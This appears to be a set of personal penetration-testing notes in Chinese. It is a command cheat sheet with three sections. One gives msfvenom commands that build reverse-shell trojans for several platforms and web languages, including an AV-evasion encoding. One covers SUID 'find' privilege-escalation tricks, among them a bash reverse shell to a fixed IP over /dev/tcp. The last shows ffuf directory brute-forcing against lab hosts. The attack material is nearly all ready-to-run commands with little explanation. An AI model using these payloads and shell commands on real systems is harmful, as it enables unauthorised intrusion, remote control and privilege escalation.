# msf 生成木马

注意：msfconsole连接的时候的`payload`应该为参数`-p`的值

```
Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=< Your IP Address> LPORT=< Your Port to Connect On> -f elf -o shell.elf

Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe
msfvenom -p windows/meterpreter/reverse_tcp lhost=172.17.17.128 lport=5555 -e x86/shikata_ga_nai -i 3 -b '\x00' -f exe -o shell.exe


Mac
msfvenom -p osx/x86/shell/reverse_tcp LHOST= LPORT= -f macho -o shell.machoWeb Payloads

PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST= LPORT= -f raw -o shell.php

ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp -o shell.asp

JSP
msfvenom -p java/jsp_shell/reverse_tcp LHOST= LPORT= -f raw -o shell.jsp

WAR
msfvenom -p java/jsp_shell/reverse_tcp LHOST= LPORT= -f war -o shell.war
Pythonmsfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw -o shell.py

Bash
msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw -o shell.sh

Perl
msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw -o shell.pl
```

# 提权

## find 命令提权n种姿势

推荐：`find . -exec /bin/sh -p \; -quit`

```bash
# 姿势一
find / -perm -g=s -type f 2>/dev/null
find . -exec /bin/sh -p \; -quit

# 姿势二
touch getshell
find / -type f -name getshell -exec "whoami" \;
find / -type f -name getshell -exec "/bin/sh" \;

# 姿势三	abc 为文件名，必须存在！
find / -name abc -exec /bin/sh -p \;
find abc -exec "/bin/sh" \;

# 姿势四，反弹shell
find /etc/passwd -exec bash -ip >& /dev/tcp/192.168.2.128/9919 0>&1 \;
```

# FUFF 工具使用

## 1. 目录爆破

### 1.1 基础爆破

在需要爆破的位置拿`FUZZ`代替

```bash
┌──(kali㉿kali)-[~/burpsuite_pro_v2022.1.1]
└─$ ffuf -u http://192.168.231.156/blog-post/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

ffuf -u URL -w Wordlist
```

![image-20231119160449654](%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E8%AE%B0.assets/image-20231119160449654.png)

### 1.2 递归爆破

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -u http://192.168.231.156/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -recursion

ffuf -u URL -w Wordlist -recursion
```

![image-20231119161052204](%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E8%AE%B0.assets/image-20231119161052204.png)

## 2. 爆破指定扩展名

此方法通常可以用来爆破网站的备份文件

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -u http://192.168.231.156/FUZZ -w wordlist/SecLists/Fuzzing/1-4_all_letters_a-z.txt -e .bak

ffuf -u URL -w Wordlist -e 扩展名
```

## 3. 静音模式和输出

可以看到fuff会输出很多信息，导致看起来有点难受，`-s`选项会减少这类输出

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -u http://192.168.231.156/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -s 

ffuf -u URL -w Wordlist -s
```

![image-20231119162728048](%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E8%AE%B0.assets/image-20231119162728048.png)

很多时候我们希望将结果保存起来，可以用下面这种方式

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -u http://192.168.231.156/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -s |tee outfile.txtt 

ffuf -u URL -w Wordlist -s |tee outfile.txt
```

![image-20231119163142511](%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E8%AE%B0.assets/image-20231119163142511.png)

## 4. 其他格式保存

FFUF还支持输出下面格式的报告：

+ JSON
+ ejson
+ html
+ md
+ csv
+ ecsv

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -u http://192.168.231.156/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -of html -o report.html

ffuf -u URL -w Wordlist -of 文件格式 -o 输出路径
```

## 5. Cookie 认证

FUFF 还支持在爆破的时候修改HTTP报文以通过某些认证

```bas
┌──(kali㉿kali)-[~]
└─$ ffuf -u http://192.168.231.156/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b "NAME1=VALUE1;NAME2=VALUE2"
```

## 6. HTTP 请求扫描

FUFF 可以直接引用HTTP请求报文来做扫描

在BurpSuite中保存HTTP请求报文

<img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E8%AE%B0.assets/image-20231119164809955.png" alt="image-20231119164809955" style="zoom:67%;" />

修改HTTP报头添加FFUF占位符

![image-20231119164901563](%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E8%AE%B0.assets/image-20231119164901563.png)

FUFF爆破

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -request request -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 

ffuf -request 请求头 -w wordlist
```

